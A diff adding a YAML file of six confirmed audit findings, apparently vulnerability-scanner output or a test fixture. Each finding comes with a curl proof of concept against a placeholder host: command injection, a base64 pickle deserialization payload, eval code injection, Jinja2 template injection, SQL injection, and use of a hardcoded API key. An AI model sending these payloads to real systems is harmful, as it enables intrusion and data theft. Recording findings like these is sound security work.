@@ -1,0 +1,88 @@
+validated_findings:
+  - finding_id: VULN-001
+    status: confirmed
+    type: command_injection
+    location:
+      file: src/run_cmd.py
+      line: 12
+    attack_path:
+      - step: 1
+        action: "Send GET request with shell metacharacters in host parameter"
+      - step: 2
+        action: "Observe injected command output appended to ping results"
+    proof_of_concept: "curl 'http://target/ping?host=;id'"
+    impact: "Arbitrary OS command running as web server user, full system compromise"
+
+  - finding_id: VULN-002
+    status: confirmed
+    type: deserialization
+    location:
+      file: src/deserialize.py
+      line: 15
+    attack_path:
+      - step: 1
+        action: "Craft malicious serialized payload with system call"
+      - step: 2
+        action: "Base64-encode the payload and submit via form data"
+      - step: 3
+        action: "Server deserializes payload, triggering embedded commands"
+    proof_of_concept: "curl -X POST http://target/load -d 'data=gASVKQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg=='"
+    impact: "Remote code running via arbitrary Python object instantiation"
+
+  - finding_id: VULN-003
+    status: confirmed
+    type: code_execution
+    location:
+      file: src/dynamic_exec.py
+      line: 10
+    attack_path:
+      - step: 1
+        action: "Send GET request with Python code in code parameter"
+      - step: 2
+        action: "Server evaluates arbitrary Python via dynamic evaluation"
+    proof_of_concept: "curl 'http://target/calc?code=__import__(\"os\").system(\"id\")'"
+    impact: "Arbitrary Python code evaluation, full server compromise"
+
+  - finding_id: VULN-004
+    status: confirmed
+    type: ssti
+    location:
+      file: src/template.py
+      line: 14
+    attack_path:
+      - step: 1
+        action: "Send GET request with Jinja2 template expression in template parameter"
+      - step: 2
+        action: "Server evaluates template, exposing internal objects and enabling RCE"
+    proof_of_concept: "curl 'http://target/render?template={{config.items()}}'"
+    impact: "Server-side template injection leading to information disclosure and RCE via Jinja2 sandbox escape"
+
+  - finding_id: VULN-005
+    status: confirmed
+    type: sql_injection
+    location:
+      file: src/db_query.py
+      line: 18
+    attack_path:
+      - step: 1
+        action: "Send GET request with SQL injection payload in name parameter"
+      - step: 2
+        action: "Injected SQL modifies query logic, extracting unauthorized data"
+    proof_of_concept: "curl 'http://target/user?name=admin%27%20OR%20%271%27=%271'"
+    impact: "Full database access, data exfiltration, potential authentication bypass"
+
+  - finding_id: VULN-006
+    status: confirmed
+    type: hardcoded_credentials
+    location:
+      file: src/secrets.py
+      line: 5
+    attack_path:
+      - step: 1
+        action: "Obtain source code via repository exposure, LFI, or path traversal"
+      - step: 2
+        action: "Extract hardcoded API secret key from secrets.py"
+      - step: 3
+        action: "Use extracted key to authenticate against external API"
+    proof_of_concept: "curl -H 'Authorization: Bearer sk-live-a1b2c3d4e5f6g7h8i9j0' https://api.target/v1/data"
+    impact: "Unauthorized access to external API services, potential data breach and financial impact"
